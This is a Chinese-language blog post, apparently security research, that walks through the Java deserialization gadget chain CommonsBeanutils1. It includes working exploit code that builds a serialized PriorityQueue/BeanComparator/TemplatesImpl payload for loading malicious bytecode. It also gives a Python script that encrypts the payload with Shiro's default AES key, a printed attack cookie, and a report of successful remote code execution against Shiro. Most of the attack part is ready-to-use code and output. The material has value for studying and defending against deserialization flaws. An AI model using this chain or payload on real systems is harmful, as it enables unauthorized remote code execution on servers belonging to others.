---
created: 2024-10-02T14:30:00+00:00
categories:
  - 技术研究
tags:
  - Java安全
updated: 2023-03-12T00:00:00+00:00
date: 2023-01-10T00:00:00+00:00
slug: java-deserialization-cb1
title: Java反序列化漏洞之CommonsBeanutils1链
cover: https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/c788693d-3953-4e39-bc64-a0cdeedc8f2d/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050157Z&X-Amz-Expires=3600&X-Amz-Signature=983cece4041b806e16fc01685600398eb5a8d46700076096f281332567ac7962&X-Amz-SignedHeaders=host&x-id=GetObject
id: 113906e1-7468-809a-99fa-f5924baf6060
---

## 前言

在上一篇文章《[Java 中动态加载字节码的几种方法](https://0xf4n9x.github.io/java-classloader#TemplatesImpl)》中，已对 CommonsBeanutils1 做了一点点铺垫。一言以蔽之，上文中所提到的 TemplatesImpl#getOutputProperties 即为 CommonsBeanutils1 中的 Sink，此部分内容即为前置知识，若有疑惑请回顾上文，在本文中将不再赘述。

## Commons BeanUtils 简介

Commons BeanUtils 是 Apache 软件基金会提供的一个开源 Java 库，用于简化 JavaBean 的操作，适用于需要频繁操作 JavaBean 的场景。它提供了一组工具类和方法，对 JavaBean 进行常见操作，如属性的复制、属性的获取和设置、属性的类型转换等。通过使用 Commons BeanUtils，开发人员可以减少重复代码的编写，提高开发效率，同时提升代码的可维护性和可扩展性。

## 受影响版本范围

Commons BeanUtils 最低影响 1.7.0，最高影响至 1.9.4；对于 Java 版本，若为 8 则通杀。

## PropertyUtils#getProperty

org.apache.commons.beanutils.PropertyUtils#getProperty 是 Commons BeanUtils 中的一个用于获取 JavaBean 对象属性值的方法。

### JavaBean

关于 JavaBean 是什么，其所具有的特征就是它必须具有一个公共无参构造方法；且通常包含一系列私有字段（即成员变量），每个字段都有对应的公共访问器（getter 方法）和修改器（setter 方法），用于访问和修改字段的值，这些方法需遵循命名规范，如`getXxx()`和`setXxx()`驼峰式命名。如下的 Person 就是一个简单的 JavaBean。

```java
package com.javasec.cb;

public class Person {
    private String name;
    private int age;

    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    public String getName() { return name; }

    public int getAge() { return age; }
}
```

当我们创建完一个 Person 对象，并需要获取它的 name、age 时，通常会调用该对象的 getName、getAge，这两个方法也是其 getter 方法。

### getProperty

现在，我们可以使用 PropertyUtils#getProperty 达到相同的效果，见如下示例代码。

```java
package com.javasec.cb;

import org.apache.commons.beanutils.PropertyUtils;

public class PropertyUtilsTest {
    public static void main(String[] args) throws Exception {
        // 创建一个JavaBean对象
        Person person = new Person("John", 30);

        // 获取person的name、age的通常做法
        System.out.println(person.getName() + ": " + person.getAge());

        System.out.println("=======================");

        // 通过getProperty达到相同的效果
        String name = (String) PropertyUtils.getProperty(person, "name");
        int age = (int) PropertyUtils.getProperty(person, "age");

        System.out.println(name + ": " + age);

    }
}
```

getProperty 方法接受两个参数，第一个是获取属性值的 JavaBean 对象，第二个则是属性名。

```java
public static Object getProperty(Object bean, String name)
        throws IllegalAccessException, InvocationTargetException,
        NoSuchMethodException {

    return (PropertyUtilsBean.getInstance().getProperty(bean, name));
}
```

需要着重注意地是，getProperty 方法会根据传入的属性名自动找到其 getter 方法，并进行调用。

## BeanComparator

org.apache.commons.beanutils.BeanComparator 是 Commons BeanUtils 库提供的一个比较器类，用于对 JavaBean 对象进行比较和排序。

### compare 方法

在 BeanComparator#compare 方法中存在对 PropertyUtils.getProperty 方法的调用，前提是 this.property 不为 null。

```java
public int compare( T o1, T o2 ) {
    if ( property == null ) {
        return internalCompare( o1, o2 );
    }
    try {
        Object value1 = PropertyUtils.getProperty( o1, property );
        Object value2 = PropertyUtils.getProperty( o2, property );
        return internalCompare( value1, value2 );
    }
    catch ( IllegalAccessException iae ) {
        throw new RuntimeException( "IllegalAccessException: " + iae.toString() );
    }
    // ...
}
```

在本文的开头，提到了关于 CommonsBeanutils1 的 Sink，即 TemplatesImpl#getOutputProperties 方法，这个方法名称是以”get”开头，符合 getter 方法的定义。

那么，结合上一部分中所提到的，getProperty 自动调用传入属性名的 setter 方法的特性，我们便可以构造如下代码，运行便会弹出计算器。

```java
package com.javasec.cb;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.beanutils.BeanComparator;

import java.lang.reflect.Field;

public class BeanComparatorTest {
    public static void main(String[] args) throws Exception {
        // Sink
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_name", "T");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(obj, "_bytecodes", new byte[][]{
                ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()
        });

        // 初始化BeanComparator对象
        BeanComparator comparator = new BeanComparator("outputProperties");
        comparator.compare(obj, obj);

    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

### 脱离 Commons Collections

在初始化 BeanComparator 时可传入 property 和 comparator，在只传入 property 时，默认 comparator 会是 ComparableComparator.getInstance()，而 ComparableComparator 这个类又属于 Commons Collections。

```java
public BeanComparator( String property ) {
    this( property, ComparableComparator.getInstance() );
}

public BeanComparator(String property, Comparator<?> comparator) {
    this.setProperty(property);
    if (comparator != null) {
        this.comparator = comparator;
    } else {
        this.comparator = ComparableComparator.getInstance();
    }
}
```

```java
package org.apache.commons.collections.comparators;

public class ComparableComparator implements Comparator, Serializable
```

这就导致必须要有 Commons Collections 的存在，CommonsBeanutils1 才可正常地利用。幸运地是在 1.9.0 至 1.9.4 版本的 Commons BeanUtils，自带了 Commons Collections 的，在这个范围内是可正常利用的。

但在 1.9.0 以下的版本，却是不包含 Commons Collections 的，所以需要找到一个替代的类，这个类需要跟 ComparableComparator 一样，同时实现了 java.util.Comparator 接口和 java.io.Serializable 接口，且该类最好是原生 JDK 自带，或者存在于 Commons BeanUtils 中，这样也能够更好地满足兼容性。

最终找到两个符合条件的类，如下图，java.lang.String.CaseInsensitiveComparator 与 java.util.Collections.ReverseComparator。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/3282bbf7-61d9-4216-883b-9772de1e7b76/0.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=b58933963d1fb1c1352826417891965082d2941900271943c8246e0c0f7579f9&X-Amz-SignedHeaders=host&x-id=GetObject)

注意它们的 private 访问修饰符，可通过同类下其他 public 访问修饰符的方法进行调用。

```java
BeanComparator comparator = new BeanComparator("outputProperties", String.CASE_INSENSITIVE_ORDER);
// BeanComparator comparator = new BeanComparator("outputProperties", Collections.reverseOrder());
```

如此，便能在无 Commons Collections 的情况下，从 Commons BeanUtils 1.7.0 至 1.9.4 版本均能够顺利地利用。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/de4e8464-0c1e-4028-8c5a-770460d47b74/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=5ca28f23d9aba2ff6634eee7e6c3fbe5ab400fb853e25510b856435943c822ed&X-Amz-SignedHeaders=host&x-id=GetObject)

以上，已对 Sink 与中间链进行了结合，现在只剩一个 Kick off 类便可拼凑成一条完整的利用链。

## PriorityQueue

`java.util.PriorityQueue`是 Java 中的一个优先队列实现类，优先队列是一种特殊的队列，其中的元素按照一定的优先级顺序排列，而不是按照它们被插入的顺序排列。

在对`PriorityQueue`进行反序列化时，如果`PriorityQueue`是使用比较器进行排序的，则会重新设置比较器，并根据比较器对元素进行排序。

在如下 readObject 方法中调用了 heapify 方法。

```java
/**
 * Reconstitutes the {@code PriorityQueue} instance from a stream
 * (that is, deserializes it).
 *
 * @param s the stream
 */
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    // Read in size, and any hidden stuff
    s.defaultReadObject();

    // Read in (and discard) array length
    s.readInt();

    SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);
    queue = new Object[size];

    // Read in all elements.
    for (int i = 0; i < size; i++)
        queue[i] = s.readObject();

    // Elements are guaranteed to be in "proper order", but the
    // spec has never explained what that might be.
    heapify();
}
```

继续跟进 heapify，发现其中存在 siftDown 的调用。

```java
private void heapify() {
    for (int i = (size >>> 1) - 1; i >= 0; i--)
        siftDown(i, (E) queue[i]);
}
```

而 siftDown 中又有 siftDownUsingComparator 方法。

```java
private void siftDown(int k, E x) {
    if (comparator != null)
        siftDownUsingComparator(k, x);
    else
        siftDownComparable(k, x);
}
```

siftDownUsingComparator 则对 compare 进行了调用。

```java
private void siftDownUsingComparator(int k, E x) {
    int half = size >>> 1;
    while (k < half) {
        int child = (k << 1) + 1;
        Object c = queue[child];
        int right = child + 1;
        if (right < size &&
            comparator.compare((E) c, (E) queue[right]) > 0)
            c = queue[child = right];
        if (comparator.compare(x, (E) c) <= 0)
            break;
        queue[k] = c;
        k = child;
    }
    queue[k] = x;
}
```

根据如上所有进行总结，当对 PriorityQueue 对象进行反序列化时，会通过 PriorityQueue#readObject 中的 heapify 方法调用到 siftDownUsingComparator，并在其中触发 BeanComparator#compare 的调用；当设置 property 为 outputProperties 时，在 BeanComparator#compare 中会通过 PropertyUtils#getProperty 触发 BeanComparator 的 getter 方法即 TemplatesImpl#getOutputProperties 的执行，最终便能够达到加载任意恶意字节码，实施攻击。

## CommonsBeanutils1 利用代码

根据如上所有，构造最终的 CommonsBeanutils1 利用代码如下。

```java
package com.javasec.cb;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.beanutils.BeanComparator;

import java.util.Collections;

// 1.7.0 <= commons-beanutils <= 1.9.4
// JDK 8 版本通杀，已在1.8.0_65和1.8.0_361版本上测试成功，
// 1.7.0_04、1.7.0_80和9均测试失败
public class CBRCEWithoutCC {
    public static void main(String[] args) throws Exception {

        // Sink
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_name", "T");
        // 可去除，TemplatesImpl#readObject方法中有创建一个TransformerFactoryImpl，并赋值给_tfactory
        // setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(obj, "_bytecodes", new byte[][]{
                ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()
        });

        /*
        ReverseComparator与CaseInsensitiveComparator均符合同时实现了Comparator和Serializable，且原生JDK自带。
         */
        BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        // BeanComparator comparator = new BeanComparator(null, Collections.reverseOrder());

        // 先正常比较，以防在序列化时就触发恶意行为
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");

        // 再利用反射将property设置为outputProperties，以调用obj的getter方法，即TemplatesImpl.getOutputProperties
        setFieldValue(comparator, "property", "outputProperties");
        // 最好进行恶意比较，以触发getOutputProperties方法的执行，最终实现通过TemplatesImpl加载恶意字节码
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        // ----------------本地序列化与反序列化测试----------------
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("CBRCEWithoutCC.ser"));
        outputStream.writeObject(queue);
        outputStream.close();

        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("CBRCEWithoutCC.ser"));
        inputStream.readObject();
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

如下是部分关键调用栈。

```java
getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax), TemplatesImpl.java
getProperty:290, PropertyUtils (org.apache.commons.beanutils), PropertyUtils.java
compare:150, BeanComparator (org.apache.commons.beanutils), BeanComparator.java
siftDownUsingComparator:722, PriorityQueue (java.util), PriorityQueue.java
siftDown:688, PriorityQueue (java.util), PriorityQueue.java
heapify:737, PriorityQueue (java.util), PriorityQueue.java
readObject:797, PriorityQueue (java.util), PriorityQueue.java
readObject:422, ObjectInputStream (java.io), ObjectInputStream.java
main:50, CBRCEWithoutCC (com.javasec.cb), CBRCEWithoutCC.java
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/9fd6fab8-5b64-4149-a5b5-d63d30034ba2/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=a9ef2fefd9238ca5d9f38524fe096baed1482abf44a1b2a9cbd5fd2e5239066c&X-Amz-SignedHeaders=host&x-id=GetObject)

## CB1 在 Shiro 中的利用

在 Shiro 中是存在 Commons BeanUtils 组件的，但未必会有 Commons Collections，所以恰巧可利用 CommonsBeanutils1 来攻击 Shiro。

编写如下简易 Python 脚本，用于生成 Payload，./CBRCEWithoutCC.ser 文件是通过如上利用代码生成的。

```python
import base64
import uuid
from Crypto.Cipher import AES

with open('./CBRCEWithoutCC.ser', 'rb') as f:
    data = f.read()

BS = AES.block_size
pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
iv = uuid.uuid4().bytes
encryptor = AES.new(base64.b64decode("kPH+bIxk5D2deZiIxcaaaA=="), AES.MODE_CBC, iv)

print("Cookie: rememberMe={}".format(base64.b64encode(iv + encryptor.encrypt(pad(data))).decode()))
# Cookie: rememberMe=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
```

运行脚本，打印恶意的 rememberMe Payload，并在 BurpSuite 中构造恶意请求，最终成功实现 RCE。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/28715472-07ae-4f38-9732-906143fa1668/3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=8c3fc756fa6aa58dcde993143b61c192705412252c4eba55a052c118a30e6f92&X-Amz-SignedHeaders=host&x-id=GetObject)

## 0x08 参考

[https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsBeanutils1.java](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsBeanutils1.java)

[https://commons.apache.org/proper/commons-beanutils/](https://commons.apache.org/proper/commons-beanutils/)

[https://github.com/phith0n/JavaThings](https://github.com/phith0n/JavaThings)
